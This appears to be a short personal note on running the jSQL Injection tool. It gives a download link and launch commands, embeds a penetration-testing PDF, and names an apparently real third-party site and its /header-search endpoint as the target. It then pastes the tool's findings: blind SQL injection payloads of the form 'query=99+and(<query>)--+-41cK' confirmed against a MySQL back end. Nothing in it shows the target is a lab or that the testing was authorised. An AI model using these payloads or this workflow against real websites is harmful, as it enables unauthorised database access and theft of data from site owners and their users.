
https://github.com/ron190/jsql-injection?tab=readme-ov-file

---
Download there [jsql-injection-v0.112.jar](https://github.com/ron190/jsql-injection/releases/download/v0.112/jsql-injection-v0.112.jar)

# Run
```sh
java -jar jsql-injection-v0.112.jar
```
Add to `.bashrc`
```sh
jsql-injection
```

Write on the search bar the server url with parameter see images [there](https://tatriz.codlop.sa/header-search?query=99) 


----

![[58Penetration_Testing_on_Websites_Using_jSQL_Injection.pdf]]


----

```sh
# Date: 2025-08-19  
# Tested on: Linux (6.8.0-71-generic)  
# Tool: jSQL Injection v0.112 ([https://github.com/ron190/jsql-injection](https://github.com/ron190/jsql-injection))  
# Database: MySQL  
  
## Vulnerability summary  
  
### Strategy: Blind bin  
Method: GET  
Path: /header-search  
Query: query=99+and(<query>)--+-41cK  
Header: Content-Type: text/plain  
  
### Strategy: Blind bit  
Method: GET  
Path: /header-search  
Query: query=99+and(<query>)--+-mNkR  
Header: Content-Type: text/plain
```